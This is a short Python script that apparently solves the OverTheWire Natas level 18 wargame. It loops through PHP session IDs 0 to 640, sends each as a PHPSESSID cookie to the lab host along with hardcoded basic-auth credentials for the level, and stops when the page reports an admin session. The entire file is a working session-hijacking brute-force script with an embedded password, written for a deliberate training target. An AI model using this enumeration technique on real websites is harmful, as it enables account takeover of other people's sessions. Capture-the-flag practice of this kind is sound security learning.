import requests

BASIC_AUTH_USER = 'natas18'
BASIC_AUTH_PASSWORD = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

def try_to_login_as_admin():
    for id_session in range(0, 641):
        cookies = {'PHPSESSID': str(id_session)}
        response = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), cookies=cookies)
        response_text = response.text
        print('Progress: ', id_session)
        if 'You are an admin' in response_text:
            print('Found credentials')
            print('Session ID', id_session)
            print(response_text)
            break

try_to_login_as_admin()